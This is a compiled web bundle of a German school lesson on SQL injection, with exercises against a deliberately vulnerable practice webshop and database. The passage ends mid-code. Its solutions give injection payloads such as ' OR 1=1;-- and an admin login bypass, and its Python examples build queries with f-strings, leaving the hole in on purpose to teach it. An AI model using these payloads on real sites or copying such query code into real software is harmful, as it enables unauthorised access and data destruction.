"use strict";(self.webpackChunkofi_blog_versioned=self.webpackChunkofi_blog_versioned||[]).push([[5799],{3905:(e,a,t)=>{t.d(a,{Zo:()=>s,kt:()=>c});var n=t(67294);function r(e,a,t){return a in e?Object.defineProperty(e,a,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[a]=t,e}function m(e,a){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);a&&(n=n.filter((function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),t.push.apply(t,n)}return t}function i(e){for(var a=1;a<arguments.length;a++){var t=null!=arguments[a]?arguments[a]:{};a%2?m(Object(t),!0).forEach((function(a){r(e,a,t[a])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):m(Object(t)).forEach((function(a){Object.defineProperty(e,a,Object.getOwnPropertyDescriptor(t,a))}))}return e}function d(e,a){if(null==e)return{};var t,n,r=function(e,a){if(null==e)return{};var t,n,r={},m=Object.keys(e);for(n=0;n<m.length;n++)t=m[n],a.indexOf(t)>=0||(r[t]=e[t]);return r}(e,a);if(Object.getOwnPropertySymbols){var m=Object.getOwnPropertySymbols(e);for(n=0;n<m.length;n++)t=m[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var p=n.createContext({}),l=function(e){var a=n.useContext(p),t=a;return e&&(t="function"==typeof e?e(a):i(i({},a),e)),t},s=function(e){var a=l(e.components);return n.createElement(p.Provider,{value:a},e.children)},o="mdxType",N={inlineCode:"code",wrapper:function(e){var a=e.children;return n.createElement(n.Fragment,{},a)}},k=n.forwardRef((function(e,a){var t=e.components,r=e.mdxType,m=e.originalType,p=e.parentName,s=d(e,["components","mdxType","originalType","parentName"]),o=l(t),k=r,c=o["".concat(p,".").concat(k)]||o[k]||N[k]||m;return t?n.createElement(c,i(i({ref:a},s),{},{components:t})):n.createElement(c,i({ref:a},s))}));function c(e,a){var t=arguments,r=a&&a.mdxType;if("string"==typeof e||r){var m=t.length,i=new Array(m);i[0]=k;var d={};for(var p in a)hasOwnProperty.call(a,p)&&(d[p]=a[p]);d.originalType=e,d[o]="string"==typeof e?e:r,i[1]=d;for(var l=2;l<m;l++)i[l]=t[l];return n.createElement.apply(null,i)}return n.createElement.apply(null,t)}k.displayName="MDXCreateElement"},17261:(e,a,t)=>{t.r(a),t.d(a,{assets:()=>p,contentTitle:()=>i,default:()=>h,frontMatter:()=>m,metadata:()=>d,toc:()=>l});var n=t(87462),r=(t(67294),t(3905));const m={sidebar_custom_props:{id:"5d2aec6f-3622-464f-b2ae-05847f62f98e"}},i="SQL Injection",d={unversionedId:"Datenbanken/sql-injection/README",id:"version-24ef/Datenbanken/sql-injection/README",title:"SQL Injection",description:"SQL-Injection (dt. SQL-Einschleusung) bezeichnet das Ausnutzen einer Sicherheitsl\xfccke im Zusammenhang mit SQL-Datenbanken, die durch mangelnde \xdcberpr\xfcfung von Benutzereingaben entsteht. Die Angreifer:in versucht dabei, \xfcber die Anwendung, die den Zugriff auf die Datenbank bereitstellt, eigene Datenbankbefehle einzuschleusen. Ziele k\xf6nnen sein, Daten auszusp\xe4hen, im eigenen Sinne zu ver\xe4ndern, die Kontrolle \xfcber den Server zu erhalten oder einfach gr\xf6sstm\xf6glichen Schaden anzurichten.",source:"@site/versioned_docs/version-24ef/03-Datenbanken/04-sql-injection/README.md",sourceDirName:"03-Datenbanken/04-sql-injection",slug:"/Datenbanken/sql-injection/",permalink:"/24ef/Datenbanken/sql-injection/",draft:!1,editUrl:"https://github.com/lebalz/ofi-blog/tree/main/docs",tags:[],version:"24ef",frontMatter:{sidebar_custom_props:{id:"5d2aec6f-3622-464f-b2ae-05847f62f98e"}},sidebar:"version-24ef/sidebar",previous:{title:"Normalformen",permalink:"/24ef/Datenbanken/nf/"},next:{title:"Simple SQL Injection Example",permalink:"/24ef/Datenbanken/sql-injection/snippets/"}},p={},l=[{value:"Konzept der SQL Injection",id:"konzept-der-sql-injection",level:2},{value:"Immer Wahr",id:"immer-wahr",level:2},{value:"Trick: mehrere Befehle",id:"trick-mehrere-befehle",level:2},{value:"Mehrere Abfragen kombinieren: <code>UNION</code>",id:"mehrere-abfragen-kombinieren-union",level:2},{value:"Wie viele Spalten hat eine Tabelle?",id:"wie-viele-spalten-hat-eine-tabelle",level:3}],s=e=>function(a){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),(0,r.kt)("div",a)},o=s("Comment"),N=s("Figure"),k=s("Answer"),c=s("Solution"),g=s("GTabs"),b={toc:l},v="wrapper";function h(e){let{components:a,...m}=e;return(0,r.kt)(v,(0,n.Z)({},b,m,{components:a,mdxType:"MDXLayout"}),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("h1",{parentName:"div",id:"sql-injection"},"SQL Injection"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:0,mdxType:"Comment"})),(0,r.kt)("blockquote",null,(0,r.kt)("div",{parentName:"blockquote",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"SQL-Injection (dt. SQL-Einschleusung) bezeichnet das Ausnutzen einer Sicherheitsl\xfccke im Zusammenhang mit SQL-Datenbanken, die durch mangelnde \xdcberpr\xfcfung von Benutzereingaben entsteht. Die Angreifer:in versucht dabei, \xfcber die Anwendung, die den Zugriff auf die Datenbank bereitstellt, eigene Datenbankbefehle einzuschleusen. Ziele k\xf6nnen sein, Daten auszusp\xe4hen, im eigenen Sinne zu ver\xe4ndern, die Kontrolle \xfcber den Server zu erhalten oder einfach gr\xf6sstm\xf6glichen Schaden anzurichten."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:0,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"blockquote",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"SQL-Injections sind dann m\xf6glich, wenn Daten wie beispielsweise Benutzereingaben direkt an die Datenbank weitergeleitet und von dieser interpretiert und direkt ausgef\xfchrt werden. ",(0,r.kt)("sup",{parentName:"p",id:"fnref-1"},(0,r.kt)("a",{parentName:"sup",href:"#fn-1",className:"footnote-ref"},"1"))),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:1,mdxType:"Comment"}))),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Doch wann werden Benutzereingaben an die Datenbank geschickt? Nehmen wir als Beispiel die SBB-Website f\xfcr die Zugverbindungen. Eine Benutzer:in sucht nach einem Startort und Zielort. Bereits w\xe4hrend der Benutzereingabe werden m\xf6gliche Bahnh\xf6fe angezeigt."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:2,mdxType:"Comment"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)(N,{parentName:"div",options:{},mdxType:"Figure"},(0,r.kt)("img",{alt:"W\xe4hrend der Eingabe __Ber__ werden die Bahnh\xf6fe &quot;Berlingen&quot;, &quot;Bern&quot;, &quot;Berlin HB&quot; angezeigt",src:t(55078).Z,width:"3030",height:"1335"}),(0,r.kt)("figcaption",{parentName:"Figure"},(0,r.kt)("span",{parentName:"figcaption",style:{flexGrow:1}}),"W\xe4hrend der Eingabe ",(0,r.kt)("strong",{parentName:"figcaption",className:"underline"},"Ber"),' werden die Bahnh\xf6fe "Berlingen", "Bern", "Berlin HB" angezeigt',(0,r.kt)("span",{parentName:"figcaption",style:{flexGrow:1}}))),(0,r.kt)(o,{parentName:"div",type:"figure",nr:0,mdxType:"Comment"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"M\xf6gliche Standorte, die mit ",(0,r.kt)("strong",{parentName:"p",className:"underline"},"Ber")," beginnen, m\xfcssen w\xe4hrend der Eingabe zuerst gesucht werden. Diese Suchanfrage wird \xfcber die URL als ",(0,r.kt)("inlineCode",{parentName:"p"},"GET"),"-Request mit dem Query-Parameter ",(0,r.kt)("inlineCode",{parentName:"p"},"match=ber")," an den SBB Autocomplete Server geschickt:"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:3,mdxType:"Comment"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"\ud83d\udc49 ",(0,r.kt)("a",{parentName:"p",href:"https://www.sbb.ch/bin/sbb/timetable/autocomplete?match=ber"},"https://www.sbb.ch/bin/sbb/timetable/autocomplete?match=ber")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:4,mdxType:"Comment"})),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"https://sbb.ch/bin/sbb/timetable/autocomplete?match=ber\n\\___/   \\____/ \\_______________________/ \\________/\n  |        |                |                |\nSchema   Host              Pfad            Query\n")),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Auf dem Server l\xe4uft das entsprechende Autocomplete-Programm, welches nun eine SQL-Abfrage ausf\xfchrt:"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:5,mdxType:"Comment"})),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT name FROM train_stations WHERE location ILIKE 'ber%';\n")),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Da der Query-Parameter ",(0,r.kt)("inlineCode",{parentName:"p"},"match")," bei jeder Anfrage anders ist, muss die SQL-Abfrage dynamisch erzeugt werden."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:6,mdxType:"Comment"})),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-py",metastring:"live_py slim",live_py:!0,slim:!0},"# normalerweise kommt der Request vom Browser\nrequest = { 'args': { 'match': 'ber' } }\n\nlocation = request['args'].get('match')\nsql = f\"SELECT name FROM train_stations WHERE location ILIKE '{location}%';\"\nprint(sql)\n")),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Die SQL-Injection Schwachstelle befindet sich in der Art des Zusammensetzens der SQL-Abfrage."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:7,mdxType:"Comment"})),(0,r.kt)("admonition",{title:"Autocomplete Legodudes",type:"aufgabe"},(0,r.kt)(k,{type:"state",webKey:"88f41ae0-b766-4dd5-b0e5-f7201f6114e7",mdxType:"Answer"}),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("dl",{parentName:"div"},(0,r.kt)("dt",{parentName:"dl"},"Datenbank\n"),(0,r.kt)("dd",{parentName:"dl"},(0,r.kt)("strong",{parentName:"dd",className:"underline"},"xkcd")),(0,r.kt)("dd",{parentName:"dl"},"\ud83d\udc49 ",(0,r.kt)("a",{parentName:"dd",href:"https://db-sql.ch/connections/9e5bd382-6110-4f04-adf7-2b46fcdadfd5/xkcd"},"https://db-sql.ch/connections/9e5bd382-6110-4f04-adf7-2b46fcdadfd5/xkcd"))),(0,r.kt)(o,{parentName:"div",type:"deflist",nr:0,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Mit folgendem Code kann eine SQL-Abfrage generiert werden. Es soll nur der ",(0,r.kt)("inlineCode",{parentName:"p"},"match"),"-Parameter angepasst werden (aktuell: ",(0,r.kt)("inlineCode",{parentName:"p"},"EF"),")"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:8,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-py",metastring:"live_py slim",live_py:!0,slim:!0},'request = { "args": { "match": "EF" } }\n\nmatch = request[\'args\'].get(\'match\')\nsql = f"""\nSELECT * \nFROM comics \nWHERE title ILIKE \'%{match}%\';\n"""\nprint(sql)\n')),(0,r.kt)("ol",{parentName:"admonition"},(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Probieren Sie einige Werte f\xfcr ",(0,r.kt)("inlineCode",{parentName:"p"},"match")," aus und f\xfchren Sie die Abfrage auf ",(0,r.kt)("a",{parentName:"p",href:"https://db-sql.ch/connections/9e5bd382-6110-4f04-adf7-2b46fcdadfd5/xkcd"},"\ud83d\udc49 xkcd")," aus."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:9,mdxType:"Comment"}))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Was passiert, wenn folgende Eingaben verwendet werden?"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:10,mdxType:"Comment"})),(0,r.kt)("ol",{parentName:"li"},(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},(0,r.kt)("inlineCode",{parentName:"p"},"data")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:11,mdxType:"Comment"}))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},(0,r.kt)("inlineCode",{parentName:"p"},"data';--")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:12,mdxType:"Comment"}))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},(0,r.kt)("inlineCode",{parentName:"p"},"data%'")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:13,mdxType:"Comment"}))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},(0,r.kt)("inlineCode",{parentName:"p"},"data%' ORDER BY title asc; --")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:14,mdxType:"Comment"}))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},(0,r.kt)("inlineCode",{parentName:"p"},"data%' OR 1=1;--")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:15,mdxType:"Comment"})))))),(0,r.kt)(k,{type:"text",webKey:"f9f72232-728d-4174-a59a-d101da20276d",mdxType:"Answer"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("h2",{parentName:"div",id:"konzept-der-sql-injection"},"Konzept der SQL Injection"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:1,mdxType:"Comment"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Die Hacker:in versucht \xfcber ein Eingabefeld (oder direkt als URL-Parameter) SQL Steuerzeichen und -Befehle an die Applikation zu senden. Wenn in der Applikation mit den Eingabedaten direkt eine SQL-Abfrage zusammengesetzt wird, l\xe4sst sich damit die Abfrage ver\xe4ndern:"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:16,mdxType:"Comment"})),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-py"},"sql = f\"SELECT name FROM train_stations WHERE location ILIKE '{location}%';\"\n")),(0,r.kt)("div",{style:{},className:"flex flex-cards"},(0,r.kt)("div",{parentName:"div",style:{flexBasis:"250px"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"normal"},"Normal"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:2,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Eingabe: ",(0,r.kt)("inlineCode",{parentName:"p"},"EF")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:17,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT * FROM train_stations\nWHERE location ILIKE 'EF%';\n")))),(0,r.kt)("div",{parentName:"div",style:{flexBasis:"250px"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"erzeuge-fehler"},"Erzeuge Fehler"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:3,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Eingabe: ",(0,r.kt)("inlineCode",{parentName:"p"},"'KRUMS;--")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:18,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT * FROM train_stations\nWHERE location ILIKE '%' KRUMS;--';\n")))),(0,r.kt)("div",{parentName:"div",style:{flexBasis:"250px"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"sortieren"},"Sortieren"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:4,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Eingabe: ",(0,r.kt)("inlineCode",{parentName:"p"},"ber' ORDER BY location DESC;--")),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:19,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT * FROM train_stations\nWHERE location ILIKE 'ber' \nORDER BY location DESC;--;\n")))),(0,r.kt)("div",{parentName:"div",style:{flexBasis:"250px"},className:"item card"})),(0,r.kt)("admonition",{title:"Entscheidend",type:"success"},(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Durch das Hochkomma ",(0,r.kt)("inlineCode",{parentName:"p"},"'")," zu Beginn der Eingabe wird der Suchtext im SQL-Befehl abgeschlossen. Somit k\xf6nnen im Anschluss eigene SQL Befehle hinzugef\xfcgt werden.\nMit einem Semikolon ",(0,r.kt)("inlineCode",{parentName:"p"},";")," wird die Abfrage abgeschlossen und der nachfolgenden SQL-Code wird mit ",(0,r.kt)("inlineCode",{parentName:"p"},"--")," auskommentiert. Somit haben wir es in eigenen H\xe4nden, dass ein korrektes SQL Query entsteht."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:20,mdxType:"Comment"}))),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Durch absichtliche Falsch-Eingaben kann schnell herausgefunden werden, ob eine Eingabe direkt an die Datenbank weitergegeben wurde und das Eingabefehld somit f\xfcr eine SQL-Injection anf\xe4llig ist."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:21,mdxType:"Comment"})),(0,r.kt)("admonition",{title:"\xdcbung 1",type:"aufgabe"},(0,r.kt)(k,{type:"state",webKey:"e7b7f9b5-655d-4572-9682-e7b1b893a5bf",mdxType:"Answer"}),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("dl",{parentName:"div"},(0,r.kt)("dt",{parentName:"dl"},"Webshop\n"),(0,r.kt)("dd",{parentName:"dl"},"\ud83d\udc49 ",(0,r.kt)("a",{parentName:"dd",href:"https://hacksql.gbsl.website"},"https://hacksql.gbsl.website")),(0,r.kt)("dt",{parentName:"dl"},"Tipp\n"),(0,r.kt)("dd",{parentName:"dl"},'Falls nichts angezeigt wird (weil jemand alles gel\xf6scht hat): Ganz unten auf der Seite hat es einen roten Knopf "Recreate Tables", welcher den urspr\xfcnglichen Zustand wiederherstellt.')),(0,r.kt)(o,{parentName:"div",type:"deflist",nr:1,mdxType:"Comment"})),(0,r.kt)("ol",{parentName:"admonition"},(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"welche Eingabefelder sind offensichtlich nicht gegen SQL-Injection gesch\xfctzt? (Es gibt also eine Fehlermeldung direkt auf der Website)"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:22,mdxType:"Comment"}))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"versuchen Sie \xfcber das Eingabefeld die Kaffee-Sorten nach der Kaffee-Mischung (blend_name) aufsteigend und absteigend zu sortieren."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:23,mdxType:"Comment"})))),(0,r.kt)(k,{type:"text",webKey:"81193f8c-c217-4e87-a3e5-defba496e6b6",mdxType:"Answer"}),(0,r.kt)(c,{webKey:"097eaf28-2aba-4ddb-990e-7b6db31f9a0b",mdxType:"Solution"},(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"aufgabe-1"},"Aufgabe 1"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:5,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Filter-Feld erzeugt eine Fehlermeldung wenn "),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:24,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"' KRUMS;--\n")),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"eingegeben wird."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:25,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"aufgabe-2"},"Aufgabe 2"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:6,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Sortieren nach blend_name"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:26,mdxType:"Comment"})),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Aufsteigend"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:27,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"' ORDER BY blend_name ASC;--\n")),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Absteigend"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:28,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"' ORDER BY blend_name DESC;--\n")))),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("h2",{parentName:"div",id:"immer-wahr"},"Immer Wahr"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:7,mdxType:"Comment"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Ein weiterer Trick bei der SQL-Injection ist das Einf\xfcgen von ",(0,r.kt)("strong",{parentName:"p"},"immer wahren Bedingungen"),". Dies wird dann verwendet, wenn eine Filter-Funktion umgangen werden soll."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:29,mdxType:"Comment"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},(0,r.kt)("strong",{parentName:"p"},"Beispiel"),": Eine Webseite m\xf6chte dem eingeloggten Benutzer alle \xfcber Ihn gespeicherten Informationen anzeigen. Dazu wird seine Mail-Adresse in die Variable $email gespeichert und folgende Abfrage zusammengestellt:"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:30,mdxType:"Comment"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Was passiert, wenn nun als ",(0,r.kt)("inlineCode",{parentName:"p"},"email")," die Eingabe ",(0,r.kt)("inlineCode",{parentName:"p"},"' OR 1=1;--")," verwendet wird?"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:31,mdxType:"Comment"})),(0,r.kt)("div",{style:{},className:"flex flex-cards"},(0,r.kt)("div",{parentName:"div",style:{flexBasis:"1400px"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"template"},"Template"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:8,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-py",metastring:"live_py slim",live_py:!0,slim:!0},'email = "reto@gymnasium.ch"\nsql = f"SELECT * FROM students WHERE email = \'{email}\'"\nprint(sql)\n')))),(0,r.kt)("div",{parentName:"div",style:{},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"eingabe"},"Eingabe"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:9,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"' OR 1=1;--\n")))),(0,r.kt)("div",{parentName:"div",style:{},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"sql-abfrage"},"SQL-Abfrage"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:10,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"SELECT * FROM students WHERE email = '' OR 1=1;--'\n"))))),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Obwohl ",(0,r.kt)("inlineCode",{parentName:"p"},"email = ''")," falsch ist, wird die Bedingung ",(0,r.kt)("inlineCode",{parentName:"p"},"1=1")," immer wahr sein. Somit werden alle Datens\xe4tze zur\xfcckgegeben."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:32,mdxType:"Comment"})),(0,r.kt)("admonition",{title:"\xdcbung 2",type:"aufgabe"},(0,r.kt)(k,{type:"state",webKey:"9cdf725a-def3-407f-858c-52e35fdf0493",mdxType:"Answer"}),(0,r.kt)("div",{parentName:"admonition",className:"commentable"},(0,r.kt)("dl",{parentName:"div"},(0,r.kt)("dt",{parentName:"dl"},"Webshop\n"),(0,r.kt)("dd",{parentName:"dl"},"\ud83d\udc49 ",(0,r.kt)("a",{parentName:"dd",href:"https://hacksql.gbsl.website"},"https://hacksql.gbsl.website"))),(0,r.kt)(o,{parentName:"div",type:"deflist",nr:2,mdxType:"Comment"})),(0,r.kt)("ol",{parentName:"admonition"},(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Versuchen Sie sich einzuloggen, ohne dabei einen Benutzername oder ein Passwort zu verwenden."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:33,mdxType:"Comment"}))),(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Einloggen hat funktioniert, nur leider hat dieser Benutzer keine Rechte. Da Sie gestern Abend im Pub zuf\xe4llig ein Gespr\xe4ch mit der Entwickler:in des Webshops geh\xf6rt haben, wissen Sie, dass es einen Admin mit der E-Mail ",(0,r.kt)("inlineCode",{parentName:"p"},"admin@mail.ch")," und eine Tabellenspalte ",(0,r.kt)("inlineCode",{parentName:"p"},"email")," geben muss. Loggen Sie sich ein und l\xf6schen Sie ein paar Kaffee-Sorten."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:34,mdxType:"Comment"})))),(0,r.kt)(k,{type:"text",webKey:"6cea78a1-6c4f-4988-bb14-72716f7e6d04",mdxType:"Answer"}),(0,r.kt)(c,{webKey:"45eefd86-7270-4c6f-abdb-690d15f7f54c",mdxType:"Solution"},"1. Einloggen",(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"' OR 1=1;--\n")),(0,r.kt)("ol",{parentName:"admonition",start:2},(0,r.kt)("li",{parentName:"ol"},(0,r.kt)("div",{parentName:"li",className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Als Admin"),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:35,mdxType:"Comment"})))),(0,r.kt)("pre",{parentName:"admonition"},(0,r.kt)("code",{parentName:"pre",className:"language-sql"},"' OR 1=1 AND email='admin@mail.ch'; --\n")))),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("h2",{parentName:"div",id:"trick-mehrere-befehle"},"Trick: mehrere Befehle"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:11,mdxType:"Comment"})),(0,r.kt)("div",{className:"commentable"},(0,r.kt)("p",{parentName:"div"},"Ein weiteres Prinzip ist die Verwendung von mehreren SQL-Befehlen. Gewisse Datenbanksysteme f\xfchren mehrere durch Semikolons ",(0,r.kt)("inlineCode",{parentName:"p"},";")," voneinander getrennte Befehle direkt nacheinander aus. Dies ist dann n\xfctzlich, wenn Eintr\xe4ge ge\xe4ndert, gel\xf6scht oder hinzugef\xfcgt werden sollen."),(0,r.kt)(o,{parentName:"div",type:"paragraph",nr:36,mdxType:"Comment"})),(0,r.kt)("div",{style:{},className:"flex flex-cards"},(0,r.kt)("div",{parentName:"div",style:{flexBasis:"1400px"},className:"item card"},(0,r.kt)("div",{parentName:"div",style:{},className:"card__body"},(0,r.kt)("div",{parentName:"div",className:"commentable"},(0,r.kt)("h4",{parentName:"div",id:"template-1"},"Template"),(0,r.kt)(o,{parentName:"div",type:"heading",nr:12,mdxType:"Comment"})),(0,r.kt)("pre",{parentName:"div"},(0,r.kt)("code",{parentName:"pre",className:"language-py",metastring:"live_py 